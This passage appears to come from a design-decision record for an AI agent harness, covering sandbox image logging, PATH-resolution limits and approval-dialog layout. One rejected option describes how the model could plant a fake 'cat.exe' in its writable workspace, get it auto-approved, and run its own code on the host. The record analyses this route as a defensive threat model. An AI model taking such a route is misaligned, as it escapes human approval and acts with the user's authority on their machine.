| **EP7** | **Our containers are labelled and the resolved image ID is logged once per process.** `SANDBOX_DOCKER_IMAGE` is a TAG, and a tag is not an identity — anything on the machine can build or pull a different image under the same name and this harness would run inside it silently. Logged rather than digest-pinned: pinning has a maintenance cost and a bump nobody makes is its own failure, while a line in `app.log` turns a silent substitution into a visible one. `--label venastine.sandbox=1` answers the other half, since a bare uuid name could not tell a container of ours from any other tool's. The probe lives at the routing site, not inside `_run_docker`, which stays a function that builds an argv and opens one process |
| **EP8** | **The Windows host-PATH resolution is a named limit of HOST_READ, and the prompt names the binary.** `_is_inert` rejects a path-qualified binary (`./ls`) precisely so a workspace-planted one cannot be NAMED; PATH lookup reaches the same place from the other side, and the harness does not choose what is on the PATH. After EP5 this applies to one tier, which always asks a human — so the fix is disclosure, not enforcement: the notice reports the absolute path `shutil.which` resolves. Resolution is total, like everything else the gate calls, because the model's input reaches it unvalidated |

### Rejected

- **Resolving inert binaries from `AGENT_WORKSPACE`.** The workspace is model-writable — the
  container mounts it `rw` and `file_ops` auto-approves writes inside it — so the model could plant
  `workspace/cat.exe`, call `cat notes.txt`, be auto-approved at tier INERT, and have the harness
  execute model-authored code on the host with the user's authority. That is exactly the attack
  `_is_inert`'s path-qualified rejection exists to prevent, arrived at from the other direction.
- **Bundling a first-party POSIX toolchain, or installing one from upstream.** It would not have
  prevented the report that prompted it: `/proc` is synthesised by the MSYS2 *runtime*, not by the
  binary, so our own MSYS `cat` prints the same shape of table naming our own install. Measured —
  two different `cat.exe` builds on the same machine produced byte-identical output. And vendoring
  GPL-3.0 coreutils would trigger a distribution obligation that `THIRD_PARTY_NOTICES.md`'s "the
  npm channel adds no licence surface at all" currently avoids, while an installer that fetches
  them adds a download, a checksum-pinning duty, a platform matrix and an update obligation.
- **Digest-pinning `SANDBOX_DOCKER_IMAGE`.** See EP7. Worth revisiting; not worth coupling to this.
- **Making `Static` focusable instead of wrapping it.** See EP3 — it fixes the visible half of the
  problem and leaves the truncation.
- **Docking the decision bar to the bottom of every dialog** (batch 49). It is immune to any
  content length by construction, and it costs the thing `height: auto` buys: the dialog then
  renders at its cap whatever it holds, so a three-line `web_search` approval is the same
  twenty-row box as a twenty-five-line one. Bounding what each block REPORTS keeps both.
- **Filling the columns with the Allow/Deny pair** (batch 49). It is symmetric, and it makes the
  permissive answer a target half the width of the modal. Centring the pair is symmetric too.
